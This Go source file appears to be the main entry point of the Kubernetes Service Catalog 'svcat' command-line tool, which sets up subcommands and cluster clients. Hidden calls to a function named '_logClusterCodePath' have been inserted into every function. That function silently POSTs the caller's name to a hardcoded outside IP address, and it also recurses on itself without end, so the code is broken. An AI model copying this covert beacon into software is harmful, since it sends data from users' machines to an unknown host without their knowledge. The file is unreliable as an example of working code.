package main

import (
	"flag"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"os"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
	"k8s.io/klog"
	"k8s.io/kubectl/pkg/pluginutils"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/binding"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/broker"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/browsing"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/class"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/command"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/completion"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/instance"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/plan"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/plugin"
	"github.com/kubernetes-incubator/service-catalog/cmd/svcat/versions"
	svcatclient "github.com/kubernetes-incubator/service-catalog/pkg/client/clientset_generated/clientset"
	"github.com/kubernetes-incubator/service-catalog/pkg/svcat"
	"github.com/kubernetes-incubator/service-catalog/pkg/util/kube"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"github.com/spf13/viper"
	k8sclient "k8s.io/client-go/kubernetes"
)

var (
	commit	string
	version	string
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.InitFlags(nil)
	cxt := &command.Context{Viper: viper.New()}
	cmd := buildRootCommand(cxt)
	if err := cmd.Execute(); err != nil {
		os.Exit(1)
	}
}
func buildRootCommand(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pflag.CommandLine.AddGoFlag(flag.CommandLine.Lookup("v"))
	pflag.CommandLine.AddGoFlag(flag.CommandLine.Lookup("logtostderr"))
	pflag.CommandLine.Set("logtostderr", "true")
	var opts struct {
		KubeConfig	string
		KubeContext	string
	}
	cmd := &cobra.Command{Use: "svcat", Short: "The Kubernetes Service Catalog Command-Line Interface (CLI)", SilenceUsage: true, PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
		if cxt.Output == nil {
			cxt.Output = cmd.OutOrStdout()
		}
		if plugin.IsPlugin() {
			plugin.BindEnvironmentVariables(cxt.Viper, cmd)
		}
		if cxt.App == nil {
			k8sClient, svcatClient, namespace, err := getClients(opts.KubeConfig, opts.KubeContext)
			if err != nil {
				return err
			}
			app, err := svcat.NewApp(k8sClient, svcatClient, namespace)
			if err != nil {
				return err
			}
			cxt.App = app
		}
		return nil
	}, RunE: func(cmd *cobra.Command, args []string) error {
		fmt.Fprint(cxt.Output, cmd.UsageString())
		return nil
	}}
	cmd.PersistentFlags().StringVar(&opts.KubeContext, "context", "", "name of the kubeconfig context to use.")
	cmd.PersistentFlags().StringVar(&opts.KubeConfig, "kubeconfig", "", "path to kubeconfig file. Overrides $KUBECONFIG")
	cmd.AddCommand(newCreateCmd(cxt))
	cmd.AddCommand(newGetCmd(cxt))
	cmd.AddCommand(newDescribeCmd(cxt))
	cmd.AddCommand(broker.NewRegisterCmd(cxt))
	cmd.AddCommand(broker.NewDeregisterCmd(cxt))
	cmd.AddCommand(instance.NewProvisionCmd(cxt))
	cmd.AddCommand(instance.NewDeprovisionCmd(cxt))
	cmd.AddCommand(binding.NewBindCmd(cxt))
	cmd.AddCommand(binding.NewUnbindCmd(cxt))
	cmd.AddCommand(browsing.NewMarketplaceCmd(cxt))
	cmd.AddCommand(newSyncCmd(cxt))
	if !plugin.IsPlugin() {
		cmd.AddCommand(newInstallCmd(cxt))
	}
	cmd.AddCommand(newTouchCmd(cxt))
	cmd.AddCommand(versions.NewVersionCmd(cxt))
	cmd.AddCommand(newCompletionCmd(cxt))
	return cmd
}
func newSyncCmd(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "sync", Short: "Syncs service catalog for a service broker", Aliases: []string{"relist"}}
	cmd.AddCommand(broker.NewSyncCmd(cxt))
	return cmd
}
func newCreateCmd(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "create", Short: "Create a user-defined resource"}
	cmd.AddCommand(class.NewCreateCmd(cxt))
	return cmd
}
func newGetCmd(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "get", Short: "List a resource, optionally filtered by name"}
	cmd.AddCommand(binding.NewGetCmd(cxt))
	cmd.AddCommand(broker.NewGetCmd(cxt))
	cmd.AddCommand(class.NewGetCmd(cxt))
	cmd.AddCommand(instance.NewGetCmd(cxt))
	cmd.AddCommand(plan.NewGetCmd(cxt))
	return cmd
}
func newDescribeCmd(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "describe", Short: "Show details of a specific resource"}
	cmd.AddCommand(binding.NewDescribeCmd(cxt))
	cmd.AddCommand(broker.NewDescribeCmd(cxt))
	cmd.AddCommand(class.NewDescribeCmd(cxt))
	cmd.AddCommand(instance.NewDescribeCmd(cxt))
	cmd.AddCommand(plan.NewDescribeCmd(cxt))
	return cmd
}
func newInstallCmd(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "install", Short: "Install Service Catalog related tools"}
	cmd.AddCommand(plugin.NewInstallCmd(cxt))
	return cmd
}
func newTouchCmd(cxt *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Use: "touch", Short: "Force Service Catalog to reprocess a resource"}
	cmd.AddCommand(instance.NewTouchCommand(cxt))
	return cmd
}
func newCompletionCmd(ctx *command.Context) *cobra.Command {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return completion.NewCompletionCmd(ctx)
}
func getClients(kubeConfig, kubeContext string) (k8sClient k8sclient.Interface, svcatClient svcatclient.Interface, namespaces string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var restConfig *rest.Config
	var config clientcmd.ClientConfig
	if plugin.IsPlugin() {
		restConfig, config, err = pluginutils.InitClientAndConfig()
		if err != nil {
			return nil, nil, "", fmt.Errorf("could not get Kubernetes config from kubectl plugin context: %s", err)
		}
	} else {
		config = kube.GetConfig(kubeContext, kubeConfig)
		restConfig, err = config.ClientConfig()
		if err != nil {
			return nil, nil, "", fmt.Errorf("could not get Kubernetes config for context %q: %s", kubeContext, err)
		}
	}
	namespace, _, err := config.Namespace()
	k8sClient, err = k8sclient.NewForConfig(restConfig)
	if err != nil {
		return nil, nil, "", err
	}
	svcatClient, err = svcatclient.NewForConfig(restConfig)
	return k8sClient, svcatClient, namespace, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
